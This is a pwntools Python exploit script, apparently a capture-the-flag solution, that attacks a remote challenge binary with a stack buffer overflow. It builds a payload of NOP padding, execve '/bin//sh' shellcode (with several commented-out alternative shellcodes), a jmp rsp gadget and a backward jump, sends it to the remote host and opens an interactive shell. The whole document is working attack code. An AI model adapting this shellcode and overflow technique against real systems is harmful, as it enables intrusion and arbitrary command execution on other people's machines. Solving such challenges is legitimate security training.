from pwn import *

# Parse our binary file
elf = ELF("./chall")

# Initialize pwn ROP engine
rop = ROP(elf)
host,port = "challs.xmas.htsp.ro",2000
# Create a debug process and load the libc
#p = gdb.debug("./chall",'''
#break *0x4006a0
#continue''')
#p = process('./chall')
p = remote(host,port)
#shellcode=b'\x58\x58\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
#shellcode =b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
shellcode = b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'
free_stack =b'\x48\x81\xec\x80\x00\x00\x00' #sub rsp,24
#shellcode=b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05'
shellcode=free_stack+shellcode
jmp_rsp = 0x40067f
print(len(shellcode))
payload = b'\x90'*(0x1E-len(shellcode))
payload += shellcode
payload += b'\x90'*0xF
payload += b'\xff\xe4'
payload += b'A'*0x8

sub_rsp = b'\xe9\xbb\xff\xff\xff'
rop_chain = [   jmp_rsp # When the main returns, it first return to the  address of the 1st code gadge
            ]
rop_chain = b''.join([p64(i) for i in rop_chain])
first_payload = payload + rop_chain + sub_rsp
print(p.recvline())
p.sendline(first_payload)
p.interactive()
